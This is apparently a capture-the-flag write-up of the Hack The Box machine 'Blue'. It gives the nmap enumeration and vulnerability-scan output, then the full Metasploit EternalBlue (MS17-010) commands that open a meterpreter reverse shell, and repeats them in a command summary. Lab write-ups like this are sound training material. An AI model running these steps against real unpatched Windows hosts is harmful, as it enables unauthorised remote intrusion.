# 🖥️ HTB Blue Writeup

**✳️ Box:** Blue  
**✳️ OS:** Windows  
**✳️ Difficulty:** Easy  

---

## 🔍 Enumeration

```bash
nmap -A 10.10.10.40
```

**Discovered open ports:**

```bash
PORT     STATE SERVICE      VERSION  
135/tcp  open  msrpc        Microsoft Windows RPC  
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn  
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
```

### 🧠 Observations:
- SMB is active on ports `139` and `445`.
- Target OS appears to be vulnerable to `ms17-010` (EternalBlue).

---

## 🔧 Vulnerability Scanning

```bash
nmap --script vuln -p 445 10.10.10.40
```

```bash
smb-vuln-ms17-010:  
  VULNERABLE:  
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
```

---

## ⚔️ Exploitation

```bash
msfconsole
```

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.XX   # ← your tun0 IP
run
```

### ✅ Result:
You should receive a meterpreter shell confirming remote access.

---

## 🏁 Flags

- `User.txt`: ✅  
- `Root.txt`: ✅  

---

## 📸 Screenshots

| 🔎 Nmap Scan        | 🎯 Vulnerability Detected     | 💥 Exploitation via Metasploit |
|--------------------|-------------------------------|-------------------------------|
| ![nmap](../screenshots/blue-nmap.png) | ![vuln](../screenshots/blue-smb-vuln.png) | ![exploit](../screenshots/blue-exploit-msf.png) |

---

## 💡 Takeaways

- EternalBlue is still relevant in vulnerable legacy systems.
- Enumeration is key — SMB exposure quickly led to exploit confirmation.
- Exploiting known vulnerabilities can yield immediate results on retired HTB machines, but don’t skip recon!

---

## ⌨️ Commands Summary (cloudpunchr@kali)

```bash
cd ~/Pentest_Vault/HTB_Blue
nmap -A 10.10.10.40
nmap --script vuln -p 445 10.10.10.40
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.XX
run
```
